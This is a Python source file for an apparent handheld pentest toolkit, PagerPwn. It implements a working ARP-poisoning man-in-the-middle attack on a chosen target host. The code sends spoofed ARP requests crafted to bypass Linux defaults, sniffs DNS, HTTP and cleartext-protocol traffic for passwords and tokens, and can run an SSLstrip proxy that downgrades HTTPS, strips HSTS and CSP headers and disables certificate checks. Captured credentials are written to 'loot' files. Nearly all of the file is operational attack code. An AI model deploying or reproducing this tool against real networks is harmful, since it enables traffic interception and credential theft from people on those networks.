"""
arp_poison.py - ARP Poison MitM + SSLstrip Module for PagerPwn

Active ARP poisoning with optional SSLstrip proxy. Intercepts traffic
between a target host and the gateway by spoofing ARP requests.

Flow:
  1. Host picker (from last recon or manual subnet scan)
  2. MAC resolution for target + gateway
  3. Mode picker: SNIFF ONLY / SSLSTRIP+SNIFF
  4. ARP poison + sniffer threads with live LCD feed
  5. Cleanup (restore ARP, remove nft rules) + loot save

ARP poison uses spoofed ARP **requests** (not just replies) to bypass
Linux arp_accept=0 default — kernel updates ARP cache from sender
fields of incoming requests.

SSLstrip: nft redirect port 80 → proxy:8080. Multi-threaded proxy
fetches upstream via HTTPS when host previously redirected, rewrites
https://→http:// in bodies/headers, strips HSTS/CSP.

nft rules scoped to target IP only to avoid redirecting pager traffic.

Module interface: run(config, ui_callback, stop_event, pager=None) -> dict
"""

import os
import re
import struct
import socket
import subprocess
import threading
import time
import fcntl
import queue
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from urllib.request import Request, urlopen
from urllib.error import URLError

from pagerctl import Pager

# ── Network helpers ─────────────────────────────────────────────────────────

ETH_P_ARP = 0x0806
ETH_P_IP = 0x0800
ARP_REQUEST = 1
ARP_REPLY = 2

PROXY_PORT = 8080


def _get_hw_addr(iface):
    """Get MAC address of interface via ioctl."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack("256s", iface.encode()[:15]))
        s.close()
        return info[18:24]
    except Exception:
        return b"\x00" * 6


def _get_ip_addr(iface):
    """Get IP of interface via ioctl."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(s.fileno(), 0x8915, struct.pack("256s", iface.encode()[:15]))
        s.close()
        return socket.inet_ntoa(info[20:24])
    except Exception:
        return None


def _resolve_mac(ip, iface, timeout=2):
    """Resolve IP to MAC via ARP request. Returns mac bytes or None."""
    src_mac = _get_hw_addr(iface)
    src_ip = _get_ip_addr(iface)
    if not src_ip:
        return None

    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ARP))
        sock.bind((iface, 0))
        sock.settimeout(0.2)
    except Exception:
        return None

    dst_ip_bytes = socket.inet_aton(ip)
    src_ip_bytes = socket.inet_aton(src_ip)
    broadcast = b"\xff" * 6

    eth = broadcast + src_mac + struct.pack(">H", ETH_P_ARP)
    arp = struct.pack(">HHBBH", 1, 0x0800, 6, 4, ARP_REQUEST)
    arp += src_mac + src_ip_bytes + b"\x00" * 6 + dst_ip_bytes

    for _ in range(3):
        try:
            sock.send(eth + arp)
        except Exception:
            pass

    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            data = sock.recv(65535)
            if len(data) < 42:
                continue
            op = struct.unpack(">H", data[20:22])[0]
            if op != ARP_REPLY:
                continue
            sender_ip = socket.inet_ntoa(data[28:32])
            if sender_ip == ip:
                sock.close()
                return data[22:28]
        except socket.timeout:
            continue
        except Exception:
            break

    sock.close()
    return None


def _mac_str(mac_bytes):
    return ":".join(f"{b:02x}" for b in mac_bytes)


def _mac_bytes(mac_str):
    return bytes(int(b, 16) for b in mac_str.split(":"))


# ── ARP poison ──────────────────────────────────────────────────────────────

def _build_arp_request(src_mac, src_ip, dst_mac, dst_ip):
    """Build a unicast spoofed ARP request. Only the intended receiver sees it."""
    eth = dst_mac + src_mac + struct.pack(">H", ETH_P_ARP)
    arp = struct.pack(">HHBBH", 1, 0x0800, 6, 4, ARP_REQUEST)
    arp += src_mac + socket.inet_aton(src_ip) + dst_mac + socket.inet_aton(dst_ip)
    return eth + arp


def _poison_loop(iface, our_mac, target_ip, target_mac, gateway_ip, gateway_mac,
                 stop_event, interval=0.5):
    """Send unicast spoofed ARP requests to target + gateway only."""
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ARP))
        sock.bind((iface, 0))
    except Exception:
        return

    # Tell target: "gateway IP is at our MAC" (unicast to target only)
    pkt_to_target = _build_arp_request(our_mac, gateway_ip, target_mac, target_ip)
    # Tell gateway: "target IP is at our MAC" (unicast to gateway only)
    pkt_to_gateway = _build_arp_request(our_mac, target_ip, gateway_mac, gateway_ip)

    while not stop_event.is_set():
        try:
            sock.send(pkt_to_target)
            sock.send(pkt_to_gateway)
        except Exception:
            pass
        for _ in range(int(interval * 20)):
            if stop_event.is_set():
                break
            time.sleep(0.05)

    sock.close()


def _restore_arp(iface, target_ip, target_mac, gateway_ip, gateway_mac):
    """Send correct ARP replies to restore victim and gateway caches."""
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ARP))
        sock.bind((iface, 0))
    except Exception:
        return

    for _ in range(3):
        # Restore target: gateway's real MAC
        eth1 = target_mac + gateway_mac + struct.pack(">H", ETH_P_ARP)
        arp1 = struct.pack(">HHBBH", 1, 0x0800, 6, 4, ARP_REPLY)
        arp1 += gateway_mac + socket.inet_aton(gateway_ip) + target_mac + socket.inet_aton(target_ip)
        # Restore gateway: target's real MAC
        eth2 = gateway_mac + target_mac + struct.pack(">H", ETH_P_ARP)
        arp2 = struct.pack(">HHBBH", 1, 0x0800, 6, 4, ARP_REPLY)
        arp2 += target_mac + socket.inet_aton(target_ip) + gateway_mac + socket.inet_aton(gateway_ip)
        try:
            sock.send(eth1 + arp1)
            sock.send(eth2 + arp2)
        except Exception:
            pass
        time.sleep(0.05)

    sock.close()


# ── Sniffer ─────────────────────────────────────────────────────────────────

def _sniffer_loop(iface, target_ip, stop_event, feed_queue):
    """Sniff traffic from target: DNS, HTTP, cleartext creds."""
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_IP))
        sock.bind((iface, 0))
        sock.settimeout(0.5)
    except Exception:
        return

    while not stop_event.is_set():
        try:
            data = sock.recv(65535)
        except socket.timeout:
            continue
        except Exception:
            break

        if len(data) < 34:
            continue

        # Ethernet header (14) + IP header
        ip_header = data[14:]
        if len(ip_header) < 20:
            continue

        ihl = (ip_header[0] & 0x0F) * 4
        total_len = struct.unpack(">H", ip_header[2:4])[0]
        # Clip to actual IP packet length (strip ethernet padding)
        ip_packet = ip_header[:total_len]
        proto = ip_packet[9]
        src_ip = socket.inet_ntoa(ip_packet[12:16])
        dst_ip = socket.inet_ntoa(ip_packet[16:20])

        # Only care about target's traffic
        if src_ip != target_ip and dst_ip != target_ip:
            continue

        payload = ip_packet[ihl:]

        # UDP (DNS)
        if proto == 17 and len(payload) >= 12:
            src_port = struct.unpack(">H", payload[0:2])[0]
            dst_port = struct.unpack(">H", payload[2:4])[0]
            udp_data = payload[8:]

            if dst_port == 53 or src_port == 53:
                _parse_dns(udp_data, src_ip, dst_ip, dst_port, feed_queue)

        # TCP (HTTP, cleartext)
        elif proto == 6 and len(payload) >= 20:
            src_port = struct.unpack(">H", payload[0:2])[0]
            dst_port = struct.unpack(">H", payload[2:4])[0]
            tcp_hdr_len = ((payload[12] >> 4) & 0x0F) * 4
            tcp_data = payload[tcp_hdr_len:]

            if not tcp_data:
                continue

            if dst_port == 80 or src_port == 80:
                _parse_http(tcp_data, src_ip, dst_ip, src_port, dst_port, feed_queue)

            # Cleartext cred protocols
            if dst_port in (21, 23, 25, 110, 143) or src_port in (21, 23, 25, 110, 143):
                _parse_cleartext(tcp_data, src_ip, dst_port, feed_queue)

    sock.close()


def _parse_dns(data, src_ip, dst_ip, dst_port, feed_queue):
    """Extract DNS query/response names."""
    if len(data) < 12:
        return
    flags = struct.unpack(">H", data[2:4])[0]
    is_response = (flags >> 15) & 1

    # Parse question section
    offset = 12
    labels = []
    while offset < len(data):
        length = data[offset]
        if length == 0:
            offset += 1
            break
        if length >= 0xC0:
            offset += 2
            break
        offset += 1
        if offset + length > len(data):
            break
        labels.append(data[offset:offset + length].decode("ascii", errors="replace"))
        offset += length

    name = ".".join(labels) if labels else ""
    if not name:
        return

    if is_response:
        feed_queue.put(("dns", f"DNS> {name}", Pager.CYAN))
    else:
        feed_queue.put(("dns", f"DNS? {name}", Pager.CYAN))


def _parse_http(data, src_ip, dst_ip, src_port, dst_port, feed_queue):
    """Extract HTTP method, host, auth headers, POST bodies."""
    try:
        text = data[:2048].decode("ascii", errors="replace")
    except Exception:
        return

    lines = text.split("\r\n")
    if not lines:
        return

    first = lines[0]

    # Request line
    if any(first.startswith(m) for m in ("GET ", "POST ", "PUT ", "HEAD ")):
        # Find Host header
        host = ""
        auth = ""
        for line in lines[1:]:
            low = line.lower()
            if low.startswith("host:"):
                host = line.split(":", 1)[1].strip()
            elif low.startswith("authorization:"):
                auth = line.split(":", 1)[1].strip()

        method_path = first.split(" ")[0:2]
        method = method_path[0] if method_path else "?"
        path = method_path[1] if len(method_path) > 1 else "/"
        if len(path) > 30:
            path = path[:29] + "~"

        feed_queue.put(("http", f"HTTP {method} {host}{path}", Pager.YELLOW))

        if auth:
            feed_queue.put(("cred", f"AUTH: {auth[:40]}", Pager.GREEN))

        # POST body
        if method == "POST" and "\r\n\r\n" in text:
            body = text.split("\r\n\r\n", 1)[1][:200]
            if body:
                # Check for credential-like fields
                low_body = body.lower()
                if any(k in low_body for k in ("pass", "user", "login", "email", "token")):
                    feed_queue.put(("cred", f"POST: {body[:50]}", Pager.GREEN))
                else:
                    feed_queue.put(("http", f"BODY: {body[:40]}", Pager.YELLOW))


def _parse_cleartext(data, src_ip, dst_port, feed_queue):
    """Parse FTP/Telnet/SMTP/POP3 cleartext creds."""
    try:
        text = data[:512].decode("ascii", errors="replace").strip()
    except Exception:
        return
    if not text:
        return

    proto_map = {21: "FTP", 23: "TELNET", 25: "SMTP", 110: "POP3", 143: "IMAP"}
    proto = proto_map.get(dst_port, "CLEAR")

    low = text.lower()
    if any(k in low for k in ("user", "pass", "login", "auth")):
        feed_queue.put(("cred", f"{proto}: {text[:50]}", Pager.GREEN))


# ── SSLstrip proxy ──────────────────────────────────────────────────────────

_https_hosts = set()  # hosts seen redirecting to HTTPS


class _StripHandler(BaseHTTPRequestHandler):
    """HTTP proxy that fetches upstream via HTTPS when needed."""

    def log_message(self, fmt, *args):
        pass  # silence

    def do_GET(self):
        self._proxy("GET")

    def do_POST(self):
        self._proxy("POST")

    def do_HEAD(self):
        self._proxy("HEAD")

    def _proxy(self, method):
        host = self.headers.get("Host", "")
        if not host:
            self.send_error(400)
            return

        path = self.path
        if path.startswith("http://"):
            # Absolute URL — extract path
            try:
                path = "/" + path.split("/", 3)[3]
            except IndexError:
                path = "/"

        # Read POST body if present
        body = None
        cl = self.headers.get("Content-Length")
        if cl:
            try:
                body = self.rfile.read(int(cl))
            except Exception:
                pass

        # Try HTTPS first if host was seen redirecting, otherwise HTTP
        use_https = host in _https_hosts
        scheme = "https" if use_https else "http"
        url = f"{scheme}://{host}{path}"

        try:
            req = Request(url, data=body, method=method)
            # Copy relevant headers
            for h in ("User-Agent", "Accept", "Accept-Language",
                       "Accept-Encoding", "Content-Type", "Cookie", "Referer"):
                val = self.headers.get(h)
                if val:
                    req.add_header(h, val)

            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            resp = urlopen(req, timeout=10, context=ctx)
            resp_body = resp.read()
            status = resp.status
            resp_headers = dict(resp.getheaders())

        except Exception as e:
            # If HTTP failed, retry with HTTPS
            if not use_https:
                _https_hosts.add(host)
                try:
                    url2 = f"https://{host}{path}"
                    req2 = Request(url2, data=body, method=method)
                    for h in ("User-Agent", "Accept", "Content-Type", "Cookie"):
                        val = self.headers.get(h)
                        if val:
                            req2.add_header(h, val)
                    import ssl
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    resp = urlopen(req2, timeout=10, context=ctx)
                    resp_body = resp.read()
                    status = resp.status
                    resp_headers = dict(resp.getheaders())
                except Exception:
                    self.send_error(502)
                    return
            else:
                self.send_error(502)
                return

        # Strip HTTPS from response body
        try:
            content_type = resp_headers.get("Content-Type", "")
            if "text" in content_type or "javascript" in content_type:
                text_body = resp_body.decode("utf-8", errors="replace")
                text_body = text_body.replace("https://", "http://")
                resp_body = text_body.encode("utf-8")
        except Exception:
            pass

        # Send response
        self.send_response(status)
        for key, val in resp_headers.items():
            low = key.lower()
            # Strip security headers
            if low in ("strict-transport-security", "content-security-policy",
                        "content-security-policy-report-only", "transfer-encoding"):
                continue
            if low == "location" and val.startswith("https://"):
                val = val.replace("https://", "http://", 1)
                _https_hosts.add(host)
            if low == "content-length":
                val = str(len(resp_body))
            self.send_header(key, val)
        self.end_headers()

        try:
            self.wfile.write(resp_body)
        except Exception:
            pass

        # Log to feed if it looks like creds
        if self.server.feed_queue and body:
            try:
                body_text = body.decode("ascii", errors="replace").lower()
                if any(k in body_text for k in ("pass", "user", "login", "token")):
                    self.server.feed_queue.put(
                        ("cred", f"STRIP: {body[:60].decode('ascii', errors='replace')}", Pager.GREEN)
                    )
            except Exception:
                pass

        if self.server.feed_queue:
            self.server.feed_queue.put(
                ("sslstrip", f"STRIP {method} {host}{path[:20]}", Pager.MAGENTA)
            )


class _ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True
    feed_queue = None


def _start_sslstrip(target_ip, feed_queue, stop_event):
    """Start SSLstrip proxy + nft redirect rules. Returns server or None."""
    # nft redirect target's port 80 → our proxy
    # shell=True because nft curly brace syntax breaks subprocess arg splitting
    nft_cmd = (
        f"nft add table ip sslstrip && "
        f"nft add chain ip sslstrip prerouting "
        f"{{ type nat hook prerouting priority -100 \\; }} && "
        f"nft add rule ip sslstrip prerouting "
        f"ip saddr {target_ip} tcp dport 80 redirect to :{PROXY_PORT}"
    )
    try:
        subprocess.run(nft_cmd, shell=True, timeout=5,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        return None

    # Enable IP forwarding
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
    except Exception:
        pass

    try:
        server = _ThreadedHTTPServer(("0.0.0.0", PROXY_PORT), _StripHandler)
        server.timeout = 1.0  # handle_request returns after 1s so we can check stop
        server.feed_queue = feed_queue

        def _serve():
            while not stop_event.is_set():
                server.handle_request()

        t = threading.Thread(target=_serve, daemon=True)
        t.start()
        return server
    except Exception:
        return None


def _stop_sslstrip():
    """Remove nft table."""
    try:
        subprocess.run("nft delete table ip sslstrip", shell=True, timeout=5,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass


# ── LCD drawing helpers ─────────────────────────────────────────────────────

def _draw_host_picker(pager, hosts, cursor):
    """Draw host selection screen. hosts is list of (ip, mac_str)."""
    pager.clear(Pager.BLACK)
    pager.fill_rect(0, 0, 480, 22, Pager.rgb(180, 0, 0))
    pager.draw_text(6, 3, "ARP POISON - SELECT TARGET", Pager.WHITE, 2)

    ROW_H = 36
    MAX_ROWS = 4
    start = max(0, cursor - MAX_ROWS // 2)
    if start + MAX_ROWS > len(hosts):
        start = max(0, len(hosts) - MAX_ROWS)
    visible = hosts[start:start + MAX_ROWS]

    y = 26
    for i, (ip, mac) in enumerate(visible):
        idx = start + i
        if idx == cursor:
            pager.fill_rect(0, y, 480, ROW_H, Pager.rgb(180, 0, 0))
            fg = Pager.WHITE
            fg2 = Pager.CYAN
        else:
            fg = Pager.CYAN
            fg2 = Pager.GRAY

        pager.draw_text(12, y + 2, ip, fg, 2)
        pager.draw_text(12, y + 20, mac, fg2, 1)
        y += ROW_H

    pager.fill_rect(0, 200, 480, 22, Pager.rgb(40, 40, 40))
    pager.draw_text(4, 203,
                    f"[UP/DN] [LT/RT]Page  [A] Select  [B] Back  {cursor+1}/{len(hosts)}",
                    Pager.GRAY, 1)
    pager.flip()


def _draw_mode_picker(pager, cursor):
    """Draw mode selection: SNIFF ONLY vs SSLSTRIP+SNIFF."""
    modes = ["SNIFF ONLY", "SSLSTRIP + SNIFF"]
    pager.clear(Pager.BLACK)
    pager.fill_rect(0, 0, 480, 22, Pager.rgb(180, 0, 0))
    pager.draw_text(6, 3, "SELECT MODE", Pager.WHITE, 2)

    y = 50
    for i, label in enumerate(modes):
        if i == cursor:
            pager.fill_rect(0, y, 480, 36, Pager.rgb(180, 0, 0))
            fg = Pager.WHITE
        else:
            fg = Pager.CYAN
        pager.draw_text(40, y + 8, label, fg, 2)
        y += 50

    pager.draw_text_centered(180, "[UP/DN] Move  [A] Select  [B] Back", Pager.GRAY, 1)
    pager.flip()


def _draw_attack_screen(pager, target_ip, gateway_ip, mode, feed_lines, scroll_offset,
                         elapsed, pkts_poisoned):
    """Draw live attack feed."""
    pager.clear(Pager.BLACK)

    # Header
    pager.fill_rect(0, 0, 480, 20, Pager.rgb(180, 0, 0))
    mode_str = "ARP+SSL" if mode == 1 else "ARP SNIFF"
    pager.draw_text(4, 2, f"{mode_str}  {target_ip}", Pager.WHITE, 2)

    # Feed area: y=22 to y=198 (176px), font size 1 = ~10px height, ~16 lines
    LINE_H = 11
    MAX_LINES = 15
    y = 22

    visible = feed_lines[scroll_offset:scroll_offset + MAX_LINES]
    for text, color in visible:
        pager.draw_text(4, y, text[:56], color, 1)
        y += LINE_H

    # Status bar
    mins, secs = divmod(elapsed, 60)
    pager.fill_rect(0, 204, 480, 18, Pager.rgb(40, 40, 40))
    total = len(feed_lines)
    end = min(scroll_offset + MAX_LINES, total)
    pager.draw_text(4, 206,
                    f"ARP:{pkts_poisoned}  {mins:02d}:{secs:02d}  [{end}/{total}]  [B] STOP",
                    Pager.GRAY, 1)
    pager.flip()


# ── Main entry point ────────────────────────────────────────────────────────

def run(config, ui_callback, stop_event, pager=None):
    """
    ARP poison MitM with optional SSLstrip.

    Args:
        config: PagerPwn config dict (needs SUBNET, IFACE, GATEWAY)
        ui_callback: function(line1, line2)
        stop_event: threading.Event
        pager: Pager object for LCD

    Returns:
        dict with attack results
    """
    if pager is None:
        ui_callback("[ARP POISON]", "No pager ref")
        time.sleep(2)
        return {"error": "no_pager"}

    iface = config.get("IFACE", "eth0")
    subnet = config.get("SUBNET", "192.168.0")
    gateway_ip = config.get("GATEWAY", f"{subnet}.1")
    our_mac = _get_hw_addr(iface)
    our_ip = _get_ip_addr(iface)

    if not our_ip:
        ui_callback("[ARP POISON]", "No IP on interface")
        time.sleep(2)
        return {"error": "no_ip"}

    # Build host list from last recon or do a quick ARP scan
    last_recon = config.get("_last_recon", {})
    arp_results = last_recon.get("arp", {})
    if not arp_results:
        ui_callback("[ARP POISON]", "Quick ARP scan...")
        from modules.arp_scan import run as arp_run
        arp_results = arp_run(config, ui_callback, stop_event)

    # Build picker list, exclude ourselves and gateway
    hosts = []
    for ip, mac_info in sorted(arp_results.items()):
        if ip == our_ip or ip == gateway_ip:
            continue
        mac = mac_info if isinstance(mac_info, str) else mac_info.get("mac", "?")
        hosts.append((ip, mac))

    if not hosts:
        pager.clear(Pager.BLACK)
        pager.draw_text_centered(100, "NO HOSTS FOUND", Pager.RED, 2)
        pager.draw_text_centered(130, "Run RECON first", Pager.GRAY, 2)
        pager.flip()
        time.sleep(2)
        return {"error": "no_hosts"}

    # ── Host picker ─────────────────────────────────────────────────────
    cursor = 0
    pager.clear_input_events()
    _draw_host_picker(pager, hosts, cursor)

    selected = None
    while not (stop_event and stop_event.is_set()):
        event = pager.get_input_event()
        if not event:
            time.sleep(0.02)
            continue
        btn, etype, _ = event
        if etype != Pager.EVENT_PRESS:
            continue

        n = len(hosts)
        if btn == Pager.BTN_UP:
            cursor = (cursor - 1) % n
            pager.beep(400, 15)
            _draw_host_picker(pager, hosts, cursor)
        elif btn == Pager.BTN_DOWN:
            cursor = (cursor + 1) % n
            pager.beep(400, 15)
            _draw_host_picker(pager, hosts, cursor)
        elif btn == Pager.BTN_LEFT:
            cursor = (cursor - 4) % n
            pager.beep(500, 20)
            _draw_host_picker(pager, hosts, cursor)
        elif btn == Pager.BTN_RIGHT:
            cursor = (cursor + 4) % n
            pager.beep(500, 20)
            _draw_host_picker(pager, hosts, cursor)
        elif btn == Pager.BTN_A:
            selected = hosts[cursor]
            pager.beep(800, 40)
            break
        elif btn == Pager.BTN_B:
            pager.beep(300, 30)
            return {"aborted": True}

    if selected is None:
        return {"aborted": True}

    target_ip, target_mac_str = selected

    # ── Mode picker ─────────────────────────────────────────────────────
    mode = 0  # 0=sniff only, 1=sslstrip+sniff
    pager.clear_input_events()
    _draw_mode_picker(pager, mode)

    while not (stop_event and stop_event.is_set()):
        event = pager.get_input_event()
        if not event:
            time.sleep(0.02)
            continue
        btn, etype, _ = event
        if etype != Pager.EVENT_PRESS:
            continue
        if btn in (Pager.BTN_UP, Pager.BTN_DOWN):
            mode = 1 - mode
            pager.beep(400, 15)
            _draw_mode_picker(pager, mode)
        elif btn == Pager.BTN_A:
            pager.beep(800, 40)
            break
        elif btn == Pager.BTN_B:
            pager.beep(300, 30)
            return {"aborted": True}

    # ── Resolve MACs ────────────────────────────────────────────────────
    ui_callback("[ARP POISON]", f"Resolving {target_ip}...")
    target_mac = _resolve_mac(target_ip, iface)
    if not target_mac:
        target_mac = _mac_bytes(target_mac_str) if target_mac_str != "?" else None
    if not target_mac:
        pager.clear(Pager.BLACK)
        pager.draw_text_centered(100, "CANT RESOLVE TARGET MAC", Pager.RED, 2)
        pager.flip()
        time.sleep(2)
        return {"error": "no_target_mac"}

    ui_callback("[ARP POISON]", f"Resolving gateway {gateway_ip}...")
    gateway_mac = _resolve_mac(gateway_ip, iface)
    if not gateway_mac:
        pager.clear(Pager.BLACK)
        pager.draw_text_centered(100, "CANT RESOLVE GATEWAY MAC", Pager.RED, 2)
        pager.flip()
        time.sleep(2)
        return {"error": "no_gw_mac"}

    # ── Enable IP forwarding ────────────────────────────────────────────
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
    except Exception:
        pass

    # ── Start attack threads ────────────────────────────────────────────
    attack_stop = threading.Event()
    feed_queue = queue.Queue()
    feed_lines = []  # list of (text, color)

    # Poison thread
    poison_t = threading.Thread(
        target=_poison_loop,
        args=(iface, our_mac, target_ip, target_mac, gateway_ip, gateway_mac, attack_stop),
        daemon=True,
    )
    poison_t.start()

    # Sniffer thread
    sniffer_t = threading.Thread(
        target=_sniffer_loop,
        args=(iface, target_ip, attack_stop, feed_queue),
        daemon=True,
    )
    sniffer_t.start()

    # SSLstrip
    ssl_server = None
    if mode == 1:
        feed_queue.put(("info", "Starting SSLstrip proxy...", Pager.MAGENTA))
        ssl_server = _start_sslstrip(target_ip, feed_queue, attack_stop)
        if ssl_server:
            feed_queue.put(("info", f"SSLstrip on :{PROXY_PORT}", Pager.MAGENTA))
        else:
            feed_queue.put(("info", "SSLstrip setup failed", Pager.RED))

    feed_queue.put(("info", f"Poisoning {target_ip} <-> {gateway_ip}", Pager.RED))
    feed_queue.put(("info", f"Target MAC: {_mac_str(target_mac)}", Pager.GRAY))

    # Red LED
    try:
        pager.led_set("a-button-led", 255)
    except Exception:
        pass

    start_time = time.time()
    scroll_offset = 0
    auto_scroll = True
    pager.clear_input_events()

    # ── Live display loop ───────────────────────────────────────────────
    MAX_FEED = 500  # cap feed lines to avoid eating all RAM

    while not (stop_event and stop_event.is_set()):
        # Drain feed queue (max 20 per frame to avoid blocking)
        drained = 0
        while drained < 20:
            try:
                item = feed_queue.get_nowait()
                feed_lines.append((item[1], item[2]))
                drained += 1
            except Exception:
                break

        # Trim old entries if over cap
        if len(feed_lines) > MAX_FEED:
            feed_lines = feed_lines[-MAX_FEED:]

        # Auto-scroll to bottom
        if auto_scroll:
            max_off = max(0, len(feed_lines) - 15)
            scroll_offset = max_off

        elapsed = int(time.time() - start_time)
        _draw_attack_screen(pager, target_ip, gateway_ip, mode,
                            feed_lines, scroll_offset, elapsed, elapsed * 2)

        # Drain all queued button events
        while True:
            event = pager.get_input_event()
            if not event:
                break
            btn, etype, _ = event
            if etype != Pager.EVENT_PRESS:
                continue
            if btn == Pager.BTN_B:
                pager.beep(200, 100)
                attack_stop.set()
                # Clear any remaining B events so the menu's input
                # monitor doesn't catch a stale hold
                pager.clear_input_events()
                break
            elif btn == Pager.BTN_UP:
                scroll_offset = max(0, scroll_offset - 1)
                auto_scroll = False
            elif btn == Pager.BTN_DOWN:
                max_off = max(0, len(feed_lines) - 15)
                scroll_offset = min(scroll_offset + 1, max_off)
                if scroll_offset >= max_off:
                    auto_scroll = True
            elif btn == Pager.BTN_LEFT:
                scroll_offset = max(0, scroll_offset - 15)
                auto_scroll = False
            elif btn == Pager.BTN_RIGHT:
                max_off = max(0, len(feed_lines) - 15)
                scroll_offset = min(scroll_offset + 15, max_off)
                if scroll_offset >= max_off:
                    auto_scroll = True

        if attack_stop.is_set():
            break

        time.sleep(0.2)

    # ── Cleanup ─────────────────────────────────────────────────────────
    attack_stop.set()

    # Signal menu's stop_event so its input monitor exits immediately
    # and doesn't fire "ABORTED" during our cleanup
    if stop_event:
        stop_event.set()

    # Show cleanup screen
    pager.clear(Pager.BLACK)
    pager.fill_rect(0, 0, 480, 22, Pager.rgb(180, 100, 0))
    pager.draw_text(6, 3, "STOPPING...", Pager.WHITE, 2)
    pager.draw_text_centered(60, "Restoring ARP tables...", Pager.YELLOW, 2)
    pager.draw_text_centered(90, f"{target_ip} <-> {gateway_ip}", Pager.GRAY, 2)
    pager.flip()

    # Stop nft FIRST so no more traffic gets redirected
    if ssl_server:
        _stop_sslstrip()
        # Force-close the server socket instead of shutdown() which blocks
        try:
            ssl_server.socket.close()
        except Exception:
            pass

    # Disable IP forwarding immediately
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0")
    except Exception:
        pass

    # Don't wait long for threads — they're daemon threads and will die
    poison_t.join(timeout=0.5)
    sniffer_t.join(timeout=0.5)

    # Restore ARP caches
    try:
        _restore_arp(iface, target_ip, target_mac, gateway_ip, gateway_mac)
    except Exception:
        pass

    # LED off
    try:
        pager.led_set("a-button-led", 0)
    except Exception:
        pass

    pager.clear(Pager.BLACK)
    pager.fill_rect(0, 0, 480, 22, Pager.rgb(0, 140, 0))
    pager.draw_text(6, 3, "ARP RESTORED", Pager.WHITE, 2)
    pager.draw_text_centered(70, "Network cleaned up", Pager.GREEN, 2)
    pager.draw_text_centered(100, f"Target: {target_ip}", Pager.CYAN, 2)
    pager.draw_text_centered(140, f"Duration: {int(time.time() - start_time)}s", Pager.GRAY, 2)
    pager.draw_text_centered(180, "[A] CONTINUE", Pager.GREEN, 2)
    pager.flip()

    # Wait for A to continue — eat all events until A press
    pager.clear_input_events()
    while True:
        event = pager.get_input_event()
        if event:
            btn, etype, _ = event
            if btn == Pager.BTN_A and etype == Pager.EVENT_PRESS:
                break
        time.sleep(0.03)

    duration = int(time.time() - start_time)

    # ── Save loot ───────────────────────────────────────────────────────
    loot_dir = config.get("LOOT_DIR", "/mmc/root/loot/pagerpwn")
    os.makedirs(loot_dir, exist_ok=True)

    ts = datetime.now().strftime("%Y-%m-%d_%H%M%S")
    loot_text = [
        "ARP POISON REPORT",
        "=================",
        f"Date:       {datetime.now().isoformat()}",
        f"Duration:   {duration}s",
        f"Interface:  {iface}",
        f"Target:     {target_ip} ({_mac_str(target_mac)})",
        f"Gateway:    {gateway_ip} ({_mac_str(gateway_mac)})",
        f"Mode:       {'SSLSTRIP+SNIFF' if mode == 1 else 'SNIFF ONLY'}",
        "",
        "CAPTURED FEED",
        "-------------",
    ]
    cred_lines = []
    for text, color in feed_lines:
        loot_text.append(f"  {text}")
        if color == Pager.GREEN:  # cred color
            cred_lines.append(text)

    loot_path = os.path.join(loot_dir, f"arp_poison_{ts}.txt")
    try:
        with open(loot_path, "w") as f:
            f.write("\n".join(loot_text) + "\n")
    except Exception:
        pass

    return {
        "target_ip": target_ip,
        "gateway_ip": gateway_ip,
        "mode": "sslstrip" if mode == 1 else "sniff",
        "duration": duration,
        "feed_count": len(feed_lines),
        "creds": cred_lines,
    }
